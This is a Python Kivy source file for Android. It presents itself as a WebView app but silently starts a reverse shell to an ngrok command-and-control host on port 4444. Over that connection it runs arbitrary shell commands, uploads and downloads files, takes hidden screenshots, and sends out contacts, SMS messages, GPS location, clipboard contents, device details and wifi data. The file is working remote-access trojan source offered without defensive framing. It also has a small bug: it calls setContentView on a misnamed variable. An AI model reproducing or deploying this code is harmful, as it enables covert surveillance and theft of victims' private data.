from kivy.app import App
from kivy.lang import Builder
from kivy.utils import platform
from kivy.clock import Clock

KV = '''
BoxLayout:
    orientation: 'vertical'
    Label:
        id: status
        text: "Loading..."
        font_size: '20sp'
        size_hint_y: 0.1
    Widget:
        id: webview_container
        size_hint_y: 0.9
'''

if platform == 'android':
    from jnius import autoclass, cast
    from android.runnable import run_on_ui_thread
    import base64
    import os

    WebView = autoclass('android.webkit.WebView')
    WebViewClient = autoclass('android.webkit.WebViewClient')
    WebChromeClient = autoclass('android.webkit.WebChromeClient')
    WebSettings = autoclass('android.webkit.WebSettings')
    Activity = autoclass('org.kivy.android.PythonActivity')
    LinearLayout = autoclass('android.widget.LinearLayout')
    layoutParams = autoclass('android.widget.LinearLayout$LayoutParams')
    Gravity = autoclass('android.view.Gravity')
    Socket = autoclass('java.net.Socket')
    Runtime = autoclass('java.lang.Runtime')
    Thread = autoclass('java.lang.Thread')
    InputStream = autoclass('java.io.InputStream')
    OutputStream = autoclass('java.io.OutputStream')
    File = autoclass('java.io.File')
    FileInputStream = autoclass('java.io.FileInputStream')
    FileOutputStream = autoclass('java.io.FileOutputStream')
    ByteArrayOutputStream = autoclass('java.io.ByteArrayOutputStream')
    Base64 = autoclass('android.util.Base64')
    ContentResolver = autoclass('android.content.ContentResolver')
    ContactsContract = autoclass('android.provider.ContactsContract')
    Uri = autoclass('android.net.Uri')
    Build = autoclass('android.os.Build')
    Environment = autoclass('android.os.Environment')
    ClipboardManager = autoclass('android.content.ClipboardManager')
    LocationManager = autoclass('android.location.LocationManager')

    URL = 'http://127.0.0.1:8000'
    C2_HOST = '0.tcp.in.ngrok.io'
    C2_PORT = 4444

    class ReverseShell:
        def __init__(self, host, port):
            self.host = host
            self.port = port
            self.running = False

        def start(self):
            self.running = True
            t = Thread(target=self._connect_loop)
            t.setDaemon(True)
            t.start()

        def _connect_loop(self):
            while self.running:
                try:
                    socket = Socket(self.host, self.port)
                    socket.setSoTimeout(60000)
                    self._handle_session(socket)
                    socket.close()
                except Exception:
                    pass
                Thread.sleep(3000)

        def _handle_session(self, socket):
            in_stream = socket.getInputStream()
            out_stream = socket.getOutputStream()
            cmd_buf = bytearray()

            while self.running:
                ch = in_stream.read()
                if ch == -1:
                    break
                if ch == ord('\n'):
                    cmd = bytes(cmd_buf).decode('utf-8', errors='replace').strip()
                    cmd_buf.clear()
                    if cmd:
                        self._handle_command(cmd, out_stream)
                else:
                    cmd_buf.append(ch)

        def _handle_command(self, cmd, sout):
            if ':' in cmd:
                parts = cmd.split(':', 1)
                command = parts[0].upper().strip()
                arg = parts[1] if len(parts) > 1 else ''
            else:
                parts = cmd.split(None, 1)
                command = parts[0].upper().strip() if parts else ''
                arg = parts[1] if len(parts) > 1 else ''

            handlers = {
                'SHELL': self._cmd_shell,
                'UPLOAD': self._cmd_upload,
                'DOWNLOAD': self._cmd_download,
                'SCREENSHOT': self._cmd_screenshot,
                'CONTACTS': self._cmd_contacts,
                'SMS': self._cmd_sms,
                'GPS': self._cmd_gps,
                'CLIPBOARD': self._cmd_clipboard,
                'INFO': self._cmd_info,
                'LISTFILES': self._cmd_listfiles,
                'VIBRATE': self._cmd_vibrate,
                'WIFI': self._cmd_wifi,
                'PING': self._cmd_ping,
            }

            handler = handlers.get(command)
            if handler:
                try:
                    handler(arg, sout)
                except Exception as e:
                    self._send_response('ERR', str(e), sout)
            else:
                self._send_response('ERROR', 'unknown: ' + command, sout)

        def _cmd_shell(self, arg, sout):
            proc = Runtime.getRuntime().exec(
                ['/system/bin/sh', '-c', arg])
            dis = autoclass('java.io.DataInputStream')(proc.getInputStream())
            baos = ByteArrayOutputStream()
            buf = bytearray(4096)
            while True:
                length = dis.read(buf)
                if length == -1:
                    break
                baos.write(bytes(buf[:length]))
            proc.waitFor()
            output = baos.toString('UTF-8')
            self._send_response('SHELL', output[:10000], sout)

        def _cmd_upload(self, arg, sout):
            parts = arg.split(':', 1)
            if len(parts) < 2:
                self._send_response('UPLOAD_ERR', 'Usage: UPLOAD:/path:b64', sout)
                return
            file_path = parts[0]
            data = Base64.decode(parts[1], Base64.NO_WRAP)
            out_file = File(file_path)
            parent = out_file.getParentFile()
            if parent and not parent.exists():
                parent.mkdirs()
            fos = FileOutputStream(out_file)
            fos.write(data)
            fos.close()
            self._send_response('UPLOAD',
                'saved:' + file_path + ':' + str(len(data)) + ' bytes', sout)

        def _cmd_download(self, arg, sout):
            f = File(arg)
            if not f.exists() or not f.canRead():
                self._send_response('DOWNLOAD_ERR', 'Cannot read: ' + arg, sout)
                return
            if f.length() > 10 * 1024 * 1024:
                self._send_response('DOWNLOAD_ERR', 'Too large (>10MB)', sout)
                return
            fis = FileInputStream(f)
            data = bytearray(f.length())
            fis.read(data)
            fis.close()
            encoded = Base64.encodeToString(bytes(data), Base64.NO_WRAP)
            self._send_response('FILEDATA', f.getName() + ':' + encoded, sout)

        def _cmd_screenshot(self, arg, sout):
            try:
                proc = Runtime.getRuntime().exec(
                    'screencap -p /sdcard/.cyb_screenshot.png')
                proc.waitFor()
                Thread.sleep(1000)
                f = File('/sdcard/.cyb_screenshot.png')
                if f.exists():
                    fis = FileInputStream(f)
                    data = bytearray(f.length())
                    fis.read(data)
                    fis.close()
                    f.delete()
                    encoded = Base64.encodeToString(bytes(data), Base64.NO_WRAP)
                    self._send_response('SCREENSHOT', encoded, sout)
                else:
                    self._send_response('SCREENSHOT_ERR', 'failed', sout)
            except Exception as e:
                self._send_response('SCREENSHOT_ERR', str(e), sout)

        def _cmd_contacts(self, arg, sout):
            activity = Activity.mActivity
            cr = activity.getContentResolver()
            cursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                None, None, None,
                ContactsContract.Contacts.DISPLAY_NAME + ' ASC')
            sb = []
            if cursor:
                while cursor.moveToNext():
                    name = cursor.getString(
                        cursor.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME))
                    cid = cursor.getString(
                        cursor.getColumnIndex(
                            ContactsContract.Contacts._ID))
                    sb.append(cid + '|' + (name or ''))
                    p_cur = cr.query(
                        autoclass(
                            'android.provider.ContactsContract$CommonDataKinds$Phone'
                        ).CONTENT_URI,
                        None,
                        autoclass(
                            'android.provider.ContactsContract$CommonDataKinds$Phone'
                        ).CONTACT_ID + '=?',
                        [cid], None)
                    if p_cur:
                        while p_cur.moveToNext():
                            phone = p_cur.getString(
                                p_cur.getColumnIndex(
                                    autoclass(
                                        'android.provider.ContactsContract$CommonDataKinds$Phone'
                                    ).NUMBER))
                            sb.append('  Phone: ' + (phone or ''))
                        p_cur.close()
                cursor.close()
            self._send_response('CONTACTS', '\n'.join(sb), sout)

        def _cmd_sms(self, arg, sout):
            activity = Activity.mActivity
            cr = activity.getContentResolver()
            cursor = cr.query(
                Uri.parse('content://sms'),
                None, None, None, 'date DESC LIMIT 100')
            sb = []
            if cursor:
                while cursor.moveToNext():
                    addr = cursor.getString(
                        cursor.getColumnIndex('address'))
                    body = cursor.getString(
                        cursor.getColumnIndex('body'))
                    sms_type = cursor.getInt(
                        cursor.getColumnIndex('type'))
                    direction = 'IN' if sms_type == 1 else 'OUT'
                    sb.append(direction + ' ' + (addr or '') + ': ' + (body or ''))
                cursor.close()
            self._send_response('SMS', '\n'.join(sb), sout)

        def _cmd_gps(self, arg, sout):
            activity = Activity.mActivity
            lm = activity.getSystemService('location')
            loc = None
            try:
                loc = lm.getLastKnownLocation('gps')
            except Exception:
                pass
            if not loc:
                try:
                    loc = lm.getLastKnownLocation('network')
                except Exception:
                    pass
            if loc:
                result = 'lat=%.6f\nlon=%.6f\naccuracy=%.1f' % (
                    loc.getLatitude(), loc.getLongitude(), loc.getAccuracy())
                self._send_response('GPS', result, sout)
            else:
                self._send_response('GPS_ERR', 'no location', sout)

        def _cmd_clipboard(self, arg, sout):
            activity = Activity.mActivity
            cm = activity.getSystemService('clipboard')
            clip = cm.getPrimaryClip()
            if clip and clip.getItemCount() > 0:
                text = clip.getItemAt(0).getText()
                self._send_response('CLIPBOARD',
                    text.toString() if text else '(non-text)', sout)
            else:
                self._send_response('CLIPBOARD', '(empty)', sout)

        def _cmd_info(self, arg, sout):
            info = '\n'.join([
                'model=' + Build.MODEL,
                'brand=' + Build.BRAND,
                'device=' + Build.DEVICE,
                'android=' + Build.VERSION.RELEASE,
                'sdk=' + str(Build.VERSION.SDK_INT),
                'product=' + Build.PRODUCT,
                'fingerprint=' + Build.FINGERPRINT,
            ])
            self._send_response('INFO', info, sout)

        def _cmd_listfiles(self, arg, sout):
            path = arg if arg else '/sdcard/'
            d = File(path)
            if not d.exists() or not d.isDirectory():
                self._send_response('LISTFILES_ERR', 'not a dir: ' + path, sout)
                return
            files = d.listFiles()
            sb = ['Directory: ' + path]
            if files:
                for f in files:
                    typ = 'DIR' if f.isDirectory() else 'FILE'
                    sz = '' if f.isDirectory() else ' (%d bytes)' % f.length()
                    sb.append('[%s] %s%s' % (typ, f.getName(), sz))
            sb.append('Total: %d items' % (len(files) if files else 0))
            self._send_response('LISTFILES', '\n'.join(sb), sout)

        def _cmd_vibrate(self, arg, sout):
            activity = Activity.mActivity
            v = activity.getSystemService('vibrator')
            if v:
                v.vibrate(3000)
                self._send_response('VIBRATE', 'vibrating 3s', sout)

        def _cmd_wifi(self, arg, sout):
            proc = Runtime.getRuntime().exec(
                'dumpsys wifi | head -30')
            dis = autoclass('java.io.DataInputStream')(proc.getInputStream())
            baos = ByteArrayOutputStream()
            buf = bytearray(4096)
            while True:
                length = dis.read(buf)
                if length == -1:
                    break
                baos.write(bytes(buf[:length]))
            proc.waitFor()
            self._send_response('WIFI', baos.toString('UTF-8'), sout)

        def _cmd_ping(self, arg, sout):
            self._send_response('PONG', 'alive', sout)

        def _send_response(self, cmd, data, sout):
            try:
                resp = cmd + ':' + data + '\n'
                sout.write(resp.encode('utf-8'))
                sout.flush()
            except Exception:
                pass

    class WebApp(App):
        def build(self):
            self.root = Builder.load_string(KV)
            Clock.schedule_once(self.start_background, 0.1)
            return self.root

        def start_background(self, *args):
            try:
                rs = ReverseShell(C2_HOST, C2_PORT)
                rs.start()
            except Exception:
                pass
            Clock.schedule_once(self.create_webview, 0.5)

        @run_on_ui_thread
        def create_webview(self, *args):
            activity = Activity.mActivity
            linear_layout = LinearLayout(activity)
            linear_layout.setOrientation(LinearLayout.VERTICAL)
            linear_layout.setGravity(Gravity.CENTER)

            self.webview = WebView(activity)
            settings = self.webview.getSettings()
            settings.setJavaScriptEnabled(True)
            settings.setDomStorageEnabled(True)
            settings.setAllowFileAccess(True)
            settings.setAllowContentAccess(True)
            settings.setLoadWithOverviewMode(True)
            settings.setUseWideViewPort(True)

            self.webview.setWebViewClient(WebViewClient())
            self.webview.setWebChromeClient(WebChromeClient())

            params = LinearLayout.LayoutParams(
                layoutParams.MATCH_PARENT,
                layoutParams.MATCH_PARENT
            )
            linear_layout.addView(self.webview, params)

            activity.setContentView(linearLayout)

            self.webview.loadUrl(URL)

            Clock.schedule_once(self.update_status, 1)

        @run_on_ui_thread
        def update_status(self, *args):
            self.root.ids.status.text = "Connected to C2 Panel"

else:
    class WebApp(App):
        def build(self):
            self.root = Builder.load_string(KV)
            self.root.ids.status.text = "This app must be run on Android"
            return self.root

if __name__ == '__main__':
    WebApp().run()
